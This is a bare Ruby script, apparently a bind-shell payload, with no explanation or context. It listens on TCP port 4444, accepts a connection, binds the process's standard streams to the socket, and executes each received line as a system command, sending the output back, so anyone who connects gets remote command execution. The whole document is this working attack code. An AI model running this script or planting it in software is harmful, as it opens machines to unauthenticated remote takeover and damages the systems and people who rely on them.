require 'socket';
s=TCPServer.new("::",4444);
c=s.accept;
s.close;
$stdin.reopen(c);
$stdout.reopen(c);
$stderr.reopen(c);
$stdin.each_line{|l|l=l.strip;next if l.length==0;(IO.popen(l,"rb"){|fd| fd.each_line {|o| c.puts(o.strip) }}) rescue nil }